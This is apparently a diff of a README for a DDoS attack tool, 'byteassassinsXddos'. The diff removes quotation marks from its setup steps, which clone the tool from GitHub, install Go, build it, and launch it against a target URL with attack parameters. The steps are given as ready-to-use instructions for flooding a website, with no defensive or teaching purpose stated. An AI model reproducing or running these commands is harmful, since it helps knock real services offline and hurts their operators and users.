@@ -25,24 +25,24 @@ A DDoS attack aims to overwhelm the devices, services, and network of its intend
 setup=>👾
 
 
-step 1 >   'git clone https://github.com/Sumitshah00/byteassassinsXddos.git'
+step 1 >   git clone https://github.com/Sumitshah00/byteassassinsXddos.git
 
 
 
-step 2 >   'cd byteassassinsXddos'
+step 2 >   cd byteassassinsXddos
 
 
 
-step 3 >  'pkg install golang'
+step 3 >  pkg install golang
 
 
 
 
-step 3 >   'go build byteassassinsXddos.go'
+step 3 >   go build byteassassinsXddos.go
 
 
 
-step 4 >  './byteassassinsXddos https://example.com 5000 get 1200 nil'
+step 4 >  ./byteassassinsXddos https://example.com 5000 get 1200 nil
 
 
 
